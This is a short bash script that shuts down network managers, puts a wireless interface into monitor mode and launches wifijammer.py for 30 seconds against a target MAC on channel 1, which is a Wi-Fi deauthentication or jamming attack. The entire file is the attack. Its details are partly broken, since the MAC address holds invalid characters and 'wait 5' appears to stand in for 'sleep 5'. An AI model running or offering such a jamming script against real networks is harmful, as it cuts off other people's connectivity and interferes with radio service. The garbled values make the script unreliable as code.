#!/usr/bin/env bash
sudo airmon-ng check kill &
sudo airmon-ng start wlan2 &
wait 5
timeout 30s sudo python wifijammer.py -c 1 -p 5 -t .00001 -s DL:3D:8D:JJ:39:52 -d --world &